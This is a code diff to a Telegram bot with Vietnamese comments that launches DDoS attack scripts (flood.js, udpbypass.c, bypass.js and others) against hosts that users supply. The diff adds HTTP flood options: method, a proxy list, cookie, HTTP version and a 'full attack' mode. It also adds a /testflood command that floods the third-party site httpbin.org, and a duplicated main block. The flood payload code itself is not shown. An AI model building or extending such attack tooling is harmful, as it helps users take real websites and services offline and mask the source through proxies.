@@ -1149,7 +1149,7 @@ def cmd_help(message):
                 "/runudp host port method - Chạy udp_improved.py\n"
                 "/runudpbypass ip port duration [packet_size] [burst] - Chạy udpbypass.c\n"
                 "/runovh host port duration threads - Chạy udpovh2gb.c\n"
-                "/runflood host time threads rate - Chạy flood.js\n"
+                "/runflood host time threads rate [method] [proxy] [options] - Chạy flood.js nâng cao\n"
                 "/runl7bypass host time rps threads [proxyfile] - Chạy bypass.js\n"
                 "/stopkill - Dừng kill.js\n"
                 "/stopudp - Dừng udp_improved.py\n"
@@ -1167,6 +1167,7 @@ def cmd_help(message):
                 "/statusl7bypass - Trạng thái bypass.js\n"
                 "/autonotify - Quản lý thông báo tự động\n"
                 "/testudpbypass - Test lệnh udpbypass\n"
+                "/testflood - Test lệnh flood nâng cao\n"
                 "/sysinfo - Thông tin CPU/RAM\n"
                 "/listtasks - Liệt kê tác vụ đang chạy\n"
                 "/statusall - Thống kê toàn bộ tác vụ\n"
@@ -1766,34 +1767,90 @@ def cmd_runflood(message):
     try:
         # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
         processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runflood...")
-        
+
         # Xóa tin nhắn lệnh sau khi đã gửi thông báo
         delete_message_immediately(message.chat.id, message.message_id)
-        
+
         # Phân tích tham số từ lệnh
-        args = message.text.split()
-        if len(args) != 5:
+        args = message.text.split()[1:]  # Bỏ qua tên lệnh
+        if len(args) < 4:
             bot.edit_message_text(
-                "⚠️ Cách dùng: /runflood <host> <time> <threads> <rate>",
+                "❌ **Cú pháp flood nâng cao:**\n"
+                "`/runflood <host> <time> <threads> <rate> [method] [proxyfile] [options]`\n\n"
+                "**Tham số bắt buộc:**\n"
+                "• `host` - Target URL\n"
+                "• `time` - Thời gian (giây)\n"
+                "• `threads` - Số luồng\n"
+                "• `rate` - Tốc độ request/s\n\n"
+                "**Tham số tùy chọn:**\n"
+                "• `method` - GET/POST (mặc định: GET)\n"
+                "• `proxyfile` - File proxy (mặc định: auto-detect)\n"
+                "• `--query <value>` - Query parameter (mặc định: 1)\n"
+                "• `--cookie \"<cookie>\"` - Cookie header (mặc định: uh=good)\n"
+                "• `--http <version>` - HTTP version 1/2 (mặc định: 2)\n"
+                "• `--debug` - Bật debug mode\n"
+                "• `--full` - Full attack mode\n"
+                "• `--winter` - Winter mode\n\n"
+                "**Ví dụ:**\n"
+                "`/runflood example.com 60 10 1000`\n"
+                "`/runflood example.com 60 10 1000 POST proxy.txt --query 5 --cookie \"session=abc\" --http 2 --debug --full`",
                 chat_id=message.chat.id,
-                message_id=processing_msg.message_id
+                message_id=processing_msg.message_id,
+                parse_mode='Markdown'
             )
-            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=30)
             return
 
-        host = args[1]
-        time = args[2]
-        threads = args[3]
-        rate = args[4]
+        host = args[0]
+        time = args[1]
+        threads = args[2]
+        rate = args[3]
 
-        # Kiểm tra nếu không có proxyfile, tự động tìm file proxies.txt
-        possible_files = ['proxies.txt', 'proxy.txt', 'proxies.lst']
-        proxyfile = None
-        for f in possible_files:
-            if os.path.isfile(f):
-                proxyfile = f
-                break
-        
+        # Parse optional parameters
+        method = 'GET'  # Default method
+        proxyfile = None  # Will auto-detect
+        query_value = '1'  # Default query
+        cookie_value = 'uh=good'  # Default cookie
+        http_version = '2'  # Default HTTP version
+        debug_mode = False
+        full_mode = False
+        winter_mode = False
+
+        # Parse remaining arguments
+        i = 4
+        while i < len(args):
+            arg = args[i]
+
+            if arg.upper() in ['GET', 'POST']:
+                method = arg.upper()
+            elif arg.endswith('.txt') or arg.endswith('.list') or arg.endswith('.lst'):
+                proxyfile = arg
+            elif arg == '--query' and i + 1 < len(args):
+                query_value = args[i + 1]
+                i += 1
+            elif arg == '--cookie' and i + 1 < len(args):
+                cookie_value = args[i + 1].strip('"\'')  # Remove quotes
+                i += 1
+            elif arg == '--http' and i + 1 < len(args):
+                http_version = args[i + 1]
+                i += 1
+            elif arg == '--debug':
+                debug_mode = True
+            elif arg == '--full':
+                full_mode = True
+            elif arg == '--winter':
+                winter_mode = True
+
+            i += 1
+
+        # Auto-detect proxy file if not specified
+        if proxyfile is None:
+            possible_files = ['proxies.txt', 'proxy.txt', 'proxies.lst']
+            for f in possible_files:
+                if os.path.isfile(f):
+                    proxyfile = f
+                    break
+
         # Nếu không tìm thấy file proxy nào
         if proxyfile is None:
             bot.edit_message_text(
@@ -1803,33 +1860,95 @@ def cmd_runflood(message):
             )
             auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
             return
-        
-        # Các tham số mặc định sẽ được thêm vào
-        cmd = ['node', 'flood.js', 'GET', host, time, threads, rate, proxyfile, '--query', '1', '--cookie', 'uh=good', '--http', '2', '--debug', '--full', '--winter']
+
+        # Kiểm tra file proxy tồn tại
+        if not os.path.isfile(proxyfile):
+            bot.edit_message_text(
+                f"❌ File proxy '{proxyfile}' không tồn tại!",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            return
+
+        # Kiểm tra file flood.js
+        if not os.path.isfile('flood.js'):
+            bot.edit_message_text(
+                "❌ File 'flood.js' không tồn tại!",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            return
+
+        # Tạo thông báo chi tiết
+        options_text = []
+        if query_value != '1':
+            options_text.append(f"Query: {query_value}")
+        if cookie_value != 'uh=good':
+            options_text.append(f"Cookie: {cookie_value}")
+        if http_version != '2':
+            options_text.append(f"HTTP: {http_version}")
+        if debug_mode:
+            options_text.append("Debug: ON")
+        if full_mode:
+            options_text.append("Full: ON")
+        if winter_mode:
+            options_text.append("Winter: ON")
+
+        options_str = f"\n🔧 **Options:** {', '.join(options_text)}" if options_text else ""
+
+        # Cập nhật thông báo
+        bot.edit_message_text(
+            f"🚀 **Đang khởi động flood attack...**\n"
+            f"🎯 **Target:** `{host}`\n"
+            f"⏱️ **Time:** {time}s\n"
+            f"🧵 **Threads:** {threads}\n"
+            f"📊 **Rate:** {rate}/s\n"
+            f"🌐 **Method:** {method}\n"
+            f"📁 **Proxy:** {proxyfile}{options_str}",
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id,
+            parse_mode='Markdown'
+        )
+
+        # Xây dựng command với các tham số
+        cmd = ['node', 'flood.js', method, host, time, threads, rate, proxyfile]
+
+        # Thêm các options
+        cmd.extend(['--query', query_value])
+        cmd.extend(['--cookie', cookie_value])
+        cmd.extend(['--http', http_version])
+
+        if debug_mode:
+            cmd.append('--debug')
+        if full_mode:
+            cmd.append('--full')
+        if winter_mode:
+            cmd.append('--winter')
+
         logger.info(f"Đang chạy flood.js với các tham số: {cmd}")
 
-        # Cập nhật thông báo thành công
-        bot.edit_message_text(
-            f"✅ Lệnh /runflood đã được nhận!\n"
-            f"🎯 Host: {host}\n"
-            f"⏱️ Time: {time}s\n"
-            f"🧵 Threads: {threads}\n"
-            f"📊 Rate: {rate}\n"
-            f"📁 Proxy: {proxyfile}\n\n"
-            f"🔄 Đang khởi động tác vụ...",
-            chat_id=message.chat.id,
-            message_id=processing_msg.message_id
-        )
+        # Tự động xóa thông báo khởi động sau 10 giây
+        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
 
         # Chạy script flood.js bất đồng bộ
         run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'flood', message)
 
+        # Log hoạt động
+        db.log_activity(
+            message.from_user.id,
+            "RUN_FLOOD",
+            f"host={host}, time={time}, threads={threads}, rate={rate}, method={method}, proxy={proxyfile}, options={options_text}"
+        )
+
     except Exception as e:
         logger.error(f"Đã xảy ra lỗi trong /runflood: {e}")
         try:
-            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runflood: {str(e)}", 
-                                chat_id=message.chat.id, 
+            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runflood: {str(e)}",
+                                chat_id=message.chat.id,
                                 message_id=processing_msg.message_id)
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
         except:
             sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runflood: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
@@ -2827,6 +2946,101 @@ def cmd_autonotify(message):
             sent = bot.reply_to(message, f"❌ Có lỗi xảy ra: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
+# ========== Test Commands ==========
+
+@bot.message_handler(commands=['testflood'])
+@ignore_old_messages
+@not_banned
+@admin_required
+@log_command
+def cmd_testflood(message):
+    """Test lệnh flood với các tham số mới"""
+    try:
+        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+        processing_msg = bot.reply_to(message, "🔄 Đang test lệnh flood nâng cao...")
+        delete_message_immediately(message.chat.id, message.message_id)
+
+        # Test với tham số mặc định
+        test_host = "httpbin.org"  # Safe test target
+        test_time = "10"  # 10 giây
+        test_threads = "2"
+        test_rate = "10"
+        test_method = "GET"
+
+        # Kiểm tra file flood.js
+        if not os.path.isfile('flood.js'):
+            bot.edit_message_text(
+                "❌ File 'flood.js' không tồn tại!",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            return
+
+        # Kiểm tra file proxy
+        possible_files = ['proxies.txt', 'proxy.txt', 'proxies.lst']
+        proxyfile = None
+        for f in possible_files:
+            if os.path.isfile(f):
+                proxyfile = f
+                break
+
+        if proxyfile is None:
+            bot.edit_message_text(
+                "❌ Không tìm thấy file proxy để test. Vui lòng tạo file proxy.txt với ít nhất 1 proxy.",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            return
+
+        # Cập nhật thông báo test
+        bot.edit_message_text(
+            f"🧪 **Test Flood Attack (Nâng cao):**\n"
+            f"🎯 **Target:** {test_host}\n"
+            f"⏱️ **Time:** {test_time}s\n"
+            f"🧵 **Threads:** {test_threads}\n"
+            f"📊 **Rate:** {test_rate}/s\n"
+            f"🌐 **Method:** {test_method}\n"
+            f"📁 **Proxy:** {proxyfile}\n"
+            f"🔧 **Options:** Query: 5, Cookie: test=123, HTTP: 2, Debug: ON\n\n"
+            f"🔄 Đang chạy test...",
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id,
+            parse_mode='Markdown'
+        )
+
+        # Xây dựng command test với các tham số nâng cao
+        cmd = [
+            'node', 'flood.js',
+            test_method, test_host, test_time, test_threads, test_rate, proxyfile,
+            '--query', '5',
+            '--cookie', 'test=123',
+            '--http', '2',
+            '--debug'
+        ]
+
+        logger.info(f"Testing flood.js với các tham số: {cmd}")
+
+        # Chạy test
+        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'flood_test', message)
+
+        # Tự động xóa thông báo sau 25 giây
+        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=25)
+
+    except Exception as e:
+        logger.error(f"Error in /testflood: {e}")
+        try:
+            bot.edit_message_text(
+                f"❌ Lỗi khi test flood: {e}",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+        except:
+            sent = bot.reply_to(message, f"❌ Lỗi khi test flood: {e}")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=15)
+
 # ========== Handler cho tin nhắn không được nhận diện ==========
 
 @bot.message_handler(func=lambda message: True)
@@ -2924,10 +3138,97 @@ if __name__ == '__main__':
             # Dừng hệ thống thông báo tự động
             stop_auto_notification()
             logger.info("🔔 Auto notification system stopped")
-            
+
             # Dừng executor
             executor.shutdown(wait=False)
             logger.info("🧹 Cleanup completed")
         except Exception as e:
             logger.error(f"Error during cleanup: {e}")
+        sys.exit(0)
+
+# ========== MAIN EXECUTION ==========
+
+if __name__ == "__main__":
+    try:
+        # Khởi tạo bot
+        logger.info(f"🤖 Bot khởi động với token bắt đầu bằng: {Config.TOKEN[:10]}")
+
+        # Test connection
+        try:
+            bot_info = bot.get_me()
+            logger.info(f"✅ Bot connected successfully: @{bot_info.username}")
+        except Exception as e:
+            logger.error(f"❌ Invalid bot token or connection failed: {e}")
+            sys.exit(1)
+
+        # Khởi tạo resource manager
+        try:
+            resource_manager.start_monitoring()
+            logger.info("✅ Resource manager started")
+        except Exception as e:
+            logger.error(f"❌ Không thể khởi động hệ thống quản lý tài nguyên: {e}")
+            sys.exit(1)
+
+        # Khởi tạo auto notification
+        try:
+            start_auto_notification()
+            logger.info("✅ Auto notification system started")
+        except Exception as e:
+            logger.error(f"❌ Không thể khởi động hệ thống thông báo tự động: {e}")
+
+        # Bắt đầu polling
+        logger.info("🚀 Bot started successfully! Listening for messages...")
+
+        # Polling với retry mechanism
+        max_retries = 5
+        retry_count = 0
+
+        while retry_count < max_retries:
+            try:
+                bot.polling(none_stop=True, interval=1, timeout=60)
+                break  # Nếu polling thành công, thoát khỏi loop
+            except Exception as api_e:
+                retry_count += 1
+                logger.error(f"❌ Telegram API Error (attempt {retry_count}/{max_retries}): {api_e}")
+                if retry_count < max_retries:
+                    logger.info(f"🔄 Retrying in 5 seconds...")
+                    time.sleep(5)
+                else:
+                    logger.error("❌ Max retries reached. Exiting...")
+                    break
+            except KeyboardInterrupt:
+                logger.info("🛑 Bot stopped by user")
+                break
+            except Exception as e:
+                retry_count += 1
+                logger.error(f"❌ Unexpected error (attempt {retry_count}/{max_retries}): {e}")
+                if retry_count < max_retries:
+                    logger.info(f"🔄 Retrying in 10 seconds...")
+                    time.sleep(10)
+                else:
+                    logger.error("❌ Max retries reached. Exiting...")
+                    break
+
+    except KeyboardInterrupt:
+        logger.info("🛑 Bot stopped by user (Ctrl+C)")
+    except Exception as e:
+        logger.error(f"❌ Fatal error: {e}")
+    finally:
+        # Cleanup
+        try:
+            # Dừng resource manager
+            resource_manager.stop_monitoring()
+            logger.info("🔄 Resource manager stopped")
+
+            # Dừng auto notification
+            stop_auto_notification()
+            logger.info("🔔 Auto notification system stopped")
+
+            # Dừng executor
+            executor.shutdown(wait=False)
+            logger.info("🧹 Cleanup completed")
+        except Exception as e:
+            logger.error(f"Error during cleanup: {e}")
+
+        logger.info("👋 Bot shutdown complete")
         sys.exit(0)
